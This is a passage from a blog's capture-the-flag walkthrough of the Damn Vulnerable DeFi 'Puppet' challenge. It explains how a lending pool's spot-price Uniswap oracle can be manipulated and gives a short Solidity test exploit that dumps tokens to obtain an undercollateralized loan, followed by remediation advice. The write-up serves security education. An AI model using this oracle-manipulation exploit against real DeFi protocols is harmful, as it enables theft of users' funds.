<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;display:grid;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">borrow</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">borrowAmount</span>) <span style="color:#728e00">public</span> <span style="color:#728e00">payable</span> <span style="color:#434f54">nonReentrant</span> {
</span></span><span style="display:flex; background-color:#e5e5e5"><span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">depositRequired</span> <span style="color:#728e00">=</span> <span style="color:#434f54">calculateDepositRequired</span>(<span style="color:#434f54">borrowAmount</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&lt;</span> <span style="color:#434f54">depositRequired</span>) <span style="color:#728e00">revert</span> <span style="color:#434f54">NotDepositingEnoughCollateral</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">&gt;</span> <span style="color:#434f54">depositRequired</span>) {
</span></span><span style="display:flex;"><span>        <span style="color:#728e00">payable</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>).<span style="color:#434f54">sendValue</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">value</span> <span style="color:#728e00">-</span> <span style="color:#434f54">depositRequired</span>);
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">deposits</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">=</span> <span style="color:#434f54">deposits</span>[<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>] <span style="color:#728e00">+</span> <span style="color:#434f54">depositRequired</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Fails if the pool doesn&#39;t have enough tokens in liquidity
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#728e00">if</span> (<span style="color:#728e00">!</span><span style="color:#434f54">token</span>.<span style="color:#728e00">transfer</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">borrowAmount</span>)) <span style="color:#728e00">revert</span> <span style="color:#434f54">TransferFailed</span>();
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">emit</span> <span style="color:#434f54">Borrowed</span>(<span style="color:#728e00">msg</span>.<span style="color:#728e00">sender</span>, <span style="color:#434f54">depositRequired</span>, <span style="color:#434f54">borrowAmount</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The first line in the function body is the most interesting one.
It calls the <code>calculateDepositRequired</code> to get the amount of ETH
we need to deposit as a collateral to borrow the given <code>amount</code> of DVT&rsquo;s.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">calculateDepositRequired</span>(<span style="color:#00979d">uint256</span> <span style="color:#434f54">amount</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">public</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">view</span>
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span>)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> (<span style="color:#434f54">amount</span> <span style="color:#728e00">*</span> <span style="color:#434f54">_computeOraclePrice</span>() <span style="color:#728e00">*</span> <span style="color:#8a7b52">2</span>) <span style="color:#728e00">/</span> <span style="color:#8a7b52">10</span><span style="color:#728e00">**</span><span style="color:#8a7b52">18</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>As we can see, user needs to deposit twice the borrow amount in
ETH as collateral. This function calls the <code>_computeOraclePrice</code>
to get the price of the token in <code>wei</code> according to Uniswap
pair.</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">_computeOraclePrice</span>() <span style="color:#728e00">private</span> <span style="color:#728e00">view</span> <span style="color:#728e00">returns</span> (<span style="color:#00979d">uint256</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#728e00">return</span> (<span style="color:#434f54">uniswapPair</span>.<span style="color:#728e00">balance</span> <span style="color:#728e00">*</span> (<span style="color:#8a7b52">10</span><span style="color:#728e00">**</span><span style="color:#8a7b52">18</span>)) <span style="color:#728e00">/</span> <span style="color:#434f54">token</span>.<span style="color:#434f54">balanceOf</span>(<span style="color:#434f54">uniswapPair</span>);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>The <code>_computeOraclePrice</code> acts as a price oracle. A terrible
price oracle, because we can manipulate it by changing balances
of the ETH/DVT Uniswap pool to take an undercollaterized loan.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Exploit</p>
<p><strong>Goal</strong>: We would like to borrow all the DVT&rsquo;s from the pool
while providing as little ETH as possible.</p>
<p>We have 1000 DVT&rsquo;s. So we can drop the price of DVT by selling
all of them. This kind of huge trade would cause an imbalance in
the ETH/DVT pool, which makes it possible to take out a loan that
appears to be sufficiently collateralized, but is in fact
undercollateralized. Then we can call the <code>borrow</code> function,
which will use the ETH/DVT as oracle and check it at the instant
when the apparent price has been manipulated:</p>
<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#728e00">function</span> <span style="color:#d35400">testExploit</span>() <span style="color:#728e00">public</span> {
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT START **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">startPrank</span>(<span style="color:#434f54">attacker</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">dvt</span>.<span style="color:#434f54">approve</span>(<span style="color:#00979d">address</span>(<span style="color:#434f54">uniswapExchange</span>), <span style="color:#434f54">ATTACKER_INITIAL_TOKEN_BALANCE</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Sell all the DVT&#39;s we have to drop its price
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#00979d">uint256</span> <span style="color:#434f54">result</span> <span style="color:#728e00">=</span> <span style="color:#434f54">uniswapExchange</span>.<span style="color:#434f54">tokenToEthSwapInput</span>(
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">ATTACKER_INITIAL_TOKEN_BALANCE</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#8a7b52">9</span> <span style="color:#728e00">*</span> <span style="color:#8a7b52">1</span><span style="color:#434f54">e18</span>,
</span></span><span style="display:flex;"><span>        <span style="color:#434f54">DEADLINE</span>
</span></span><span style="display:flex;"><span>    );
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">assertGt</span>(<span style="color:#434f54">result</span>, <span style="color:#8a7b52">9</span> <span style="color:#00979d">ether</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">// Get the undercollateralized loan
</span></span></span><span style="display:flex;"><span><span style="color:#95a5a6"></span>    <span style="color:#434f54">puppetPool</span>.<span style="color:#434f54">borrow</span>{<span style="color:#728e00">value</span><span style="color:#728e00">:</span> <span style="color:#8a7b52">20</span> <span style="color:#00979d">ether</span>}(<span style="color:#8a7b52">100</span><span style="color:#434f54">_000e18</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">vm</span>.<span style="color:#434f54">stopPrank</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#95a5a6">/** EXPLOIT END **/</span>
</span></span><span style="display:flex;"><span>    <span style="color:#434f54">validation</span>();
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div></li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Summary and key takeaways</p>
<p>In general it is hard to use price oracles safely. And it&rsquo;s not
always obvious that you&rsquo;re using a price oracle.</p>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>Remediation</p>
<p>There are a few solutions that you might want to
consider to protect yourself.</p>
<ul>
<li>Don&rsquo;t use on chain AMM&rsquo;s as price oracles.</li>
<li>Always consider the implications of dependencies on third-party projects.</li>
<li>Do not dive in shallow markets. Markets without enough
liquidity are dangerous and easier to manipulate.</li>
<li>Time-Weighted Average Price (TWAP). Uniswap V2 introduced a
<a href="https://docs.uniswap.org/protocol/V2/concepts/core-concepts/oracles"  class="external-link" target="_blank" rel="noopener">TWAP
oracle</a>, which is resistant to oracle manipulation attacks.</li>
<li>M-of-N reporters: Use something like
<a href="https://data.chain.link/"  class="external-link" target="_blank" rel="noopener">Chainlink price oracles</a>, which
aggregates price data from Chainlink operators and exposes it
on-chain.</li>
<li>Speed bumps: Implement a delay of as short as 1 block between
a user entering and exiting your system.</li>
</ul>
</li>
</ul>
  <!--list-separator-->
<ul>
<li>
<p>References</p>
<p>Check out these references if you want to learn more about
dangers of price oracles:</p>
<ul>
<li><a href="https://blog.openzeppelin.com/secure-smart-contract-guidelines-the-dangers-of-price-oracles/"  class="external-link" target="_blank" rel="noopener">Smart
Contract Security Guidelines #3: The Dangers of Price
Oracles</a> - Workshop by OpenZeppelin.</li>
<li><a href="https://samczsun.com/so-you-want-to-use-a-price-oracle/"  class="external-link" target="_blank" rel="noopener">So
you want to use a price oracle</a> - Everything you need to know
about price oracles and how to use them safely. Blog post by <a href="https://samczsun.com/author/samczsun/"  class="external-link" target="_blank" rel="noopener">samczsun</a>.</li>
<li><a href="https://samczsun.com/taking-undercollateralized-loans-for-fun-and-for-profit/"  class="external-link" target="_blank" rel="noopener">Taking
undercollateralized loans for fun and for profit</a> - Another
cool blog post by
<a href="https://samczsun.com/author/samczsun/"  class="external-link" target="_blank" rel="noopener">samczsun</a> from 2019.</li>
<li><a href="https://docs.uniswap.org/protocol/V2/guides/smart-contract-integration/building-an-oracle"  class="external-link" target="_blank" rel="noopener">Building
an Oracle</a> - Guide by Uniswap V2.</li>
</ul>
<hr>
<p>I hope you enjoyed this writeup. The complete code is
<a href="https://github.com/vyorkin/damn-vulnerable-defi-solutions/blob/master/src/test/Levels/puppet/Puppet.t.sol"  class="external-link" target="_blank" rel="noopener">here</a>.</p>
<p>Let&rsquo;s move on! The next challenge is <a href="https://vyorkin.org/posts/ctf-walkthrough-damn-vulnerable-defi-9-puppet-v2" >#9
Puppet V2</a>.</p>
</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p><span class="org-todo todo DRAFT">DRAFT</span>  Damn Vulnerable DeFi, #9 Puppet v2</p>
  <!--list-separator-->
<ul>
<li>Challenge</li>
</ul>
  <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
  <!--list-separator-->
<ul>
<li>Solution</li>
</ul>
  <!--list-separator-->
<ul>
<li>Conclusion &amp; remediation</li>
</ul>
  <!--list-separator-->
<ul>
<li>References</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li><span class="org-todo todo DRAFT">DRAFT</span>  Damn Vulnerable DeFi, #10 Free rider</li>
</ul>
<!--list-separator-->
<ul>
<li>
<p>Damn Vulnerable DeFi, #11 Backdoor</p>
 <!--list-separator-->
<ul>
<li>
<p>Challenge</p>
 <div class="quote2">
<p>To incentivize the creation of more secure wallets in their
team, someone has deployed a registry of <a href="https://github.com/safe-global/safe-contracts/blob/v1.3.0/contracts/GnosisSafe.sol"  class="external-link" target="_blank" rel="noopener">Gnosis Safe wallets</a>.
When someone in the team deploys and registers a wallet, they
will earn 10 DVT tokens.</p>
<p>To make sure everything is safe and sound, the registry tightly
integrates with the legitimate <a href="https://github.com/gnosis/safe-contracts/blob/v1.3.0/contracts/proxies/GnosisSafeProxyFactory.sol"  class="external-link" target="_blank" rel="noopener">Gnosis Safe Proxy Factory</a>, and
has some additional safety checks.</p>
<p>Currently there are four people registered as beneficiaries:
Alice, Bob, Charlie and David. The registry has 40 DVT tokens in
balance to be distributed among them.</p>
<p>Your goal is to take all funds from the registry. In a single
transaction.</p>
 </div>
</li>
</ul>
 <!--list-separator-->
<ul>
<li>Analysis</li>
</ul>
 <!--list-separator-->
<ul>
<li>Solution</li>
</ul>
 <!--list-separator-->
<ul>
<li>Remediation</li>
</ul>
 <!--list-separator-->
<ul>
<li>Conclusion</li>
</ul>
 <!--list-separator-->
<ul>
<li>References</li>
</ul>
</li>
</ul>
<!--list-separator-->
<ul>
<li><span class="org-todo todo TODO">TODO</span>  Damn Vulnerable DeFi, #12 Climber</li>
</ul>
<!--list-separator-->
<ul>
<li><span class="org-todo todo TODO">TODO</span>  Damn Vulnerable DeFi, #13 Safe miners</li>
</ul>
<h4 id="paradigm-ctf-2021-paradigm-ctf-2021">
  Paradigm CTF 2021 :paradigm-ctf-2021:
  <a class="heading-link" href="#paradigm-ctf-2021-paradigm-ctf-2021">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
<h4 id="paradigm-ctf-2022-paradigm-ctf-2022">
  Paradigm CTF 2022 :paradigm-ctf-2022:
  <a class="heading-link" href="#paradigm-ctf-2022-paradigm-ctf-2022">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h4>
        
      </div>


      <footer>
        


        
        
        
        
        

        
        
      </footer>
    </article>

    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css"
    integrity="sha384-vKruj+a13U8yHIkAyGgK1J3ArTLzrFGBbBc0tDp4ad/EyewESeXE/Iv67Aj8gKZ0" crossorigin="anonymous">
  
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js"
    integrity="sha384-PwRUT/YqbnEjkZO0zZxNqcxACrXe+j766U2amXcgMg5457rve2Y7I6ZJSm2A0mS4" crossorigin="anonymous"></script>
  <script defer src="https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js"
    integrity="sha384-+VBxd3r6XgURycqtZ117nYw44OOcIax56Z4dCRWbxyPt0Koah1uHoK0o4+/RRE05" crossorigin="anonymous"
    onload="renderMathInElement(document.body,
      {
        delimiters: [
          {left: '$$', right: '$$', display:true},
          {left: '$', right: '$', display:false},
          {left: '\\(', right: '\\)', display: false},
          {left: '\\[', right: '\\]', display: true}
        ]
      }
    );"></script>
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      1985 -
    
    2024
     Vasiliy Yorkin 
    
  </section>
</footer>

  </main>

  

  
  
  <script src="https://vyorkin.org/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  
  
    
      <script async src="https://www.googletagmanager.com/gtag/js?id=G-F8R77TYF8B"></script>
      <script>
        var doNotTrack = false;
        if ( false ) {
          var dnt = (navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack);
          var doNotTrack = (dnt == "1" || dnt == "yes");
        }
        if (!doNotTrack) {
          window.dataLayer = window.dataLayer || [];
          function gtag(){dataLayer.push(arguments);}
          gtag('js', new Date());
          gtag('config', 'G-F8R77TYF8B');
        }
      </script>
    
  



  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>

</html>
